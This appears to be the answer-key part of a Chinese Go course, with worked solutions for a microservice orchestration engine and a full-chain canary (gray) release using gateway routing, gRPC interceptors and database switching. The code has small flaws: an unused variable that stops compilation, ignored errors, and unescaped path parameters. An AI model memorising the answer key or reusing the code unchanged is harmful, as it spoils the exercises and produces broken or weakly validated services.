    config   *OrchestrationConfig
    registry ServiceRegistry // 服务发现
    client   *http.Client
}

func (e *OrchestrationEngine) Execute(ctx context.Context, routeKey string, params map[string]string) (map[string]interface{}, error) {
    route, ok := e.config.Routes[routeKey]
    if !ok {
        return nil, fmt.Errorf("route %s not found", routeKey)
    }

    switch route.Mode {
    case "parallel":
        return e.executeParallel(ctx, route, params)
    case "serial":
        return e.executeSerial(ctx, route, params)
    default:
        return nil, fmt.Errorf("unsupported mode: %s", route.Mode)
    }
}

func (e *OrchestrationEngine) executeParallel(ctx context.Context, route *CompositeRoute, params map[string]string) (map[string]interface{}, error) {
    type stepResult struct {
        name   string
        result interface{}
        err    error
    }

    resultCh := make(chan stepResult, len(route.Steps))
    var wg sync.WaitGroup

    for _, step := range route.Steps {
        wg.Add(1)
        go func(s Step) {
            defer wg.Done()
            data, err := e.callService(ctx, s, params)
            resultCh <- stepResult{name: s.Name, result: data, err: err}
        }(step)
    }

    go func() {
        wg.Wait()
        close(resultCh)
    }()

    merged := make(map[string]interface{})
    hasError := false

    for res := range resultCh {
        if res.err != nil {
            hasError = true
            switch route.Fallback.Type {
            case "partial":
                merged[res.name] = route.Fallback.Default
            case "fail_all":
                return nil, fmt.Errorf("step %s failed: %v", res.name, res.err)
            }
        } else {
            merged[res.name] = res.result
        }
    }

    return merged, nil
}

func (e *OrchestrationEngine) executeSerial(ctx context.Context, route *CompositeRoute, params map[string]string) (map[string]interface{}, error) {
    merged := make(map[string]interface{})
    executed := make(map[string]interface{})

    for _, step := range route.Steps {
        // 检查依赖是否执行完成
        for _, dep := range step.DependsOn {
            if _, ok := executed[dep]; !ok {
                return nil, fmt.Errorf("dependency %s not met for step %s", dep, step.Name)
            }
        }
        // 将前置步骤的结果注入参数
        enrichedParams := e.enrichParams(params, merged, step)

        data, err := e.callService(ctx, step, enrichedParams)
        if err != nil {
            return nil, fmt.Errorf("step %s failed: %v", step.Name, err)
        }
        merged[step.Name] = data
        executed[step.Name] = data
    }

    return merged, nil
}

func (e *OrchestrationEngine) callService(ctx context.Context, step Step, params map[string]string) (interface{}, error) {
    addr, err := e.registry.Resolve(step.Service)
    if err != nil {
        return nil, fmt.Errorf("service %s not found: %v", step.Service, err)
    }

    // 替换路径中的参数占位符
    path := step.Path
    for k, v := range params {
        path = strings.ReplaceAll(path, ":"+k, v)
    }

    url := fmt.Sprintf("http://%s%s", addr, path)
    req, _ := http.NewRequestWithContext(ctx, step.Method, url, nil)

    // 设置超时
    clientCtx, cancel := context.WithTimeout(ctx, 5*time.Second)
    defer cancel()
    req = req.WithContext(clientCtx)

    resp, err := e.client.Do(req)
    if err != nil {
        return nil, err
    }
    defer resp.Body.Close()

    var result interface{}
    json.NewDecoder(resp.Body).Decode(&result)
    return result, nil
}
```

**请求入口 Handler**：

```go
// GET /api/v1/user-profile?user_id=123
func (e *OrchestrationEngine) Handler(c *gin.Context) {
    routeKey := c.Request.URL.Path
    params := map[string]string{
        "user_id": c.Query("user_id"),
    }

    result, err := e.Execute(c.Request.Context(), routeKey, params)
    if err != nil {
        c.JSON(500, gin.H{"error": err.Error()})
        return
    }
    c.JSON(200, result)
}
```

请求 `/api/v1/user-profile?user_id=123` 返回示例：
```json
{
    "user_info": {"id": 123, "name": "张三", "email": "zhangsan@example.com"},
    "recent_orders": [{"id": 5001, "amount": 99.00}, {"id": 5002, "amount": 199.00}],
    "points": {"balance": 1500, "level": "gold"}
}
```

**解析**：
- **并行模式**：多个下游调用同时发起，总耗时 = max(各调用耗时)。适合无依赖的下游服务聚合（如用户主页同时需用户信息 + 订单 + 积分）。
- **串行模式 + DependsOn**：先查用户 ID → 用结果查订单 → 用订单 ID 查详情。`DependsOn` 声明依赖关系，引擎自动按序执行并从上游注入参数。
- **Fallback 策略**：`partial` 模式返回部分数据（积分服务挂了仍返回用户信息 + 订单），`fail_all` 模式任一失败则整体 500。根据业务场景选择——用户首页偏好 partial（有数据比没数据好），支付流程偏好 fail_all（数据不一致比没数据更危险）。

**改值实验**：
- **把积分服务 (points) 的地址改成不存在**：`partial` 模式下，`points` 字段返回 `{}`（Fallback.Default），`user_info` 和 `recent_orders` 正常。前端可以展示"积分加载失败"的友好提示。`fail_all` 模式下整体返回 500，用户看到的是错误页面而非不完整的首页。
- **把并行调用数量从 3 个增加到 20 个**：`http.Client` 默认没有连接数限制，但操作系统文件描述符有限（默认 1024），大量并发请求可能耗尽 fd。应设置 `http.Transport.MaxConnsPerHost` 限制并发连接数。

---

### K-115-P2 全链路灰度发布 ⭐

**标准答案**：

**设计思路**：

```
                        ┌─────────────────┐
                        │   API Gateway    │
                        │  (流量入口)       │
                        └──────┬──────────┘
                               │ X-Version: gray-1.0
                ┌──────────────┼──────────────┐
                │ 10% gray     │ 90% stable   │
                ▼              ▼              │
        ┌──────────┐   ┌──────────┐          │
        │ User-Svc │   │ User-Svc │          │
        │ (gray)   │   │ (stable) │          │
        └────┬─────┘   └────┬─────┘          │
             │              │                 │
             │ Context传递   │                 │
             │ X-Version    │                 │
             ▼              ▼                 │
        ┌──────────┐   ┌──────────┐          │
        │ Order-Svc│   │ Order-Svc│          │
        │ (gray)   │   │ (stable) │          │
        └──────────┘   └──────────┘          │
```

**1. 网关层流量染色与分流**：

```go
type GrayRouteHandler struct {
    stableServices map[string]string // service -> address
    grayServices   map[string]string // service -> gray address
    grayRatio     float64            // 灰度比例 (0~1)
}

func (h *GrayRouteHandler) Proxy(c *gin.Context) {
    service := c.Param("service")
    path := c.Param("path")

    version := c.GetHeader("X-Version")

    var targetAddr string

    if version != "" {
        // 显式指定版本：路由到对应实例
        switch version {
        case "gray-1.0":
            targetAddr = h.grayServices[service]
        default:
            targetAddr = h.stableServices[service]
        }
    } else {
        // 按比例分流
        targetAddr = h.selectByRatio(service)
        if targetAddr == h.grayServices[service] {
            version = "gray-1.0"
            // 注入灰度标识到请求头，向下游透传
            c.Request.Header.Set("X-Version", "gray-1.0")
        }
    }

    if targetAddr == "" {
        c.JSON(502, gin.H{"error": "service not found"})
        return
    }

    // 使用 httputil.ReverseProxy 转发请求
    proxy := httputil.NewSingleHostReverseProxy(&url.URL{
        Scheme: "http",
        Host:   targetAddr,
    })
    proxy.ServeHTTP(c.Writer, c.Request)
}

func (h *GrayRouteHandler) selectByRatio(service string) string {
    if rand.Float64() < h.grayRatio {
        if addr, ok := h.grayServices[service]; ok {
            return addr
        }
    }
    return h.stableServices[service]
}
```

**2. 灰度标识在微服务调用链中透传**：

```go
// gRPC 拦截器：从 Context 提取 X-Version 并注入到 metadata
func GrayClientInterceptor() grpc.UnaryClientInterceptor {
    return func(ctx context.Context, method string, req, reply interface{},
        cc *grpc.ClientConn, invoker grpc.UnaryInvoker, opts ...grpc.CallOption) error {

        if version := ctx.Value("x-version"); version != nil {
            md := metadata.Pairs("x-version", version.(string))
            ctx = metadata.NewOutgoingContext(ctx, md)
        }
        return invoker(ctx, method, req, reply, cc, opts...)
    }
}

// 服务端拦截器：从 metadata 提取 X-Version 并注入 Context
func GrayServerInterceptor() grpc.UnaryServerInterceptor {
    return func(ctx context.Context, req interface{}, info *grpc.UnaryServerInfo,
        handler grpc.UnaryHandler) (interface{}, error) {

        if md, ok := metadata.FromIncomingContext(ctx); ok {
            if versions := md.Get("x-version"); len(versions) > 0 {
                ctx = context.WithValue(ctx, "x-version", versions[0])
            }
        }
        return handler(ctx, req)
    }
}

// 数据库路由：根据灰度标识选择数据源
func GetDB(ctx context.Context) *gorm.DB {
    version, _ := ctx.Value("x-version").(string)
    if strings.HasPrefix(version, "gray") {
        return grayDB // 灰度数据库
    }
    return stableDB // 正式数据库
}
```

**3. Gateway 统一入口：Gin 中间件提取并注入 Context**：

```go
func GrayContextMiddleware() gin.HandlerFunc {
    return func(c *gin.Context) {
        if version := c.GetHeader("X-Version"); version != "" {
            ctx := context.WithValue(c.Request.Context(), "x-version", version)
            c.Request = c.Request.WithContext(ctx)
        }
        c.Next()
    }
}
```

**配置示例 (gray.yaml)**：

```yaml
gray_config:
  ratio: 0.1  # 10% 流量进入灰度
  services:
    user-service:
      stable: "user-svc-stable:8081"
      gray:   "user-svc-gray:8081"
    order-service:
      stable: "order-svc-stable:8082"
      gray:   "order-svc-gray:8082"
    point-service:
      stable: "point-svc-stable:8083"
      gray:   "point-svc-gray:8083"
  databases:
    stable: "mysql-stable:3306/main_db"
    gray:   "mysql-gray:3306/gray_db"
```

**解析**：
- **双层灰度判定**：① 请求头 `X-Version` = 人工指定（QA 测试灰度版本）；② 无 Header 时按比例随机分流（生产灰度）。双重机制覆盖测试和线上场景。
- **Context 透传链**：Gateway（Gin Context）→ gRPC（metadata）→ 下游服务（Gin/gRPC Context）。每一步都有拦截器自动处理，业务代码无感知。
- **灰度数据库隔离**：灰度实例连接独立数据库，防止灰度 Bug 污染正式数据。这在数据库 schema 变更（如新增字段）的灰度上线中尤为重要——灰度版本写了新字段，正式版本读取时不会出错。

**改值实验**：
- **把灰度比例从 10% 改为 100%**：所有流量进入灰度。这是全量发布前的最后一步验证——先 1% → 10% → 50% → 100%，逐步扩大灰度范围，每个阶段监控错误率和延迟。
- **去掉 gRPC 拦截器中的 Context 透传**：Service A（灰度）调用 Service B 时丢失 `X-Version`，B 会路由到正式实例。结果：一个用户的请求在 Service A 走到了灰度（新逻辑），在 Service B 走到了正式（旧逻辑），新旧逻辑不一致可能导致数据错乱。这是全链路灰度中最容易踩的坑——**灰度标识必须在每个 RPC 调用中透传**。